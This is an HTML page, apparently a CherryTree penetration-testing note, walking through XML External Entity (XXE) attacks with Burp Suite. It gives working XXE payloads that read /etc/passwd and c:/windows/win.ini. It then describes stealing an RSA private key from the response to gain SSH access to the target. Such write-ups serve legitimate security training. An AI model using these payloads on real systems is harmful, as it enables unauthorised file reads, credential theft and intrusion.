<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>XML External Entities</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>XML External Entities</h1><br/>XEE or XXE<br /><br />Run with burpsuite.<br /><br />Lets try to read /etc/passwd in different ways. For Windows you could try to read:<br /><br />C:\windows\system32\drivers\etc\hosts<br />In this first case notice that SYSTEM &quot;file:///etc/passwd&quot; will also work.<br /><br />&lt;!--?xml version=&quot;1.0&quot; ?--&gt;<br />&lt;!DOCTYPE foo [&lt;!ENTITY example SYSTEM &quot;/etc/passwd&quot;&gt; ]&gt;<br />&lt;data&gt;&amp;example;&lt;/data&gt;<br /><br /><br />Considering that the target is running a version of Windows, we will be using c:/windows/win.ini file in<br />order to test out the exploit&#39;s validity. In BurpSuite, send the request to the Repeater module by right-<br />clicking on the request and clicking Send to Repeater or by pressing the CTRL + R combination on your<br />keyboard. Then, switch to the Repeater tab at the top of the BurpSuite window and change the XML data<br />section of the request to the following:<br /><br />&lt;?xml version=&quot;1.0&quot;?&gt;<br />&lt;!DOCTYPE root [&lt;!ENTITY test SYSTEM &#39;file:///c:/windows/win.ini&#39;&gt;]&gt;<br />&lt;order&gt;<br />&lt;quantity&gt;<br />3<br />&lt;/quantity&gt;<br />&lt;item&gt;<br /><strong>&amp;test;</strong><br />&lt;/item&gt;<br />&lt;address&gt;<br />17th Estate, CA<br />&lt;/address&gt;<br />&lt;/order&gt;<br /><br /><br /><a href=""><img src="images/45-1.png" alt="images/45-1.png" /></a><br /><br />The output of the win.ini file on the target itself is dispalyed in our response message, which proves that<br />the XML External Entity vulnerability is present.<br /><br />Example:<br /><br /><a href=""><img src="images/45-2.png" alt="images/45-2.png" /></a><br /><br />The RSA key is printed out in the output, from where it can be placed in a local file on your machine named<br />id_rsa , which you can later use to connect to the target at any point in time. Pick a folder to create the file<br />in and run the commands below.<br /><br /><a href=""><img src="images/45-3.png" alt="images/45-3.png" /></a><br /><br />Next, copy the RSA key present in the Response in BurpSuite and paste it into the id_rsa file using the text<br />editor of your choice. It&#39;s also important to set the right privileges for the id_rsa file so as to be accepted<br />by your SSH client. The commands below will achieve and verify this.<br /><br /><a href=""><img src="images/45-4.png" alt="images/45-4.png" /></a><br /><br /></div>
</body>
</html>
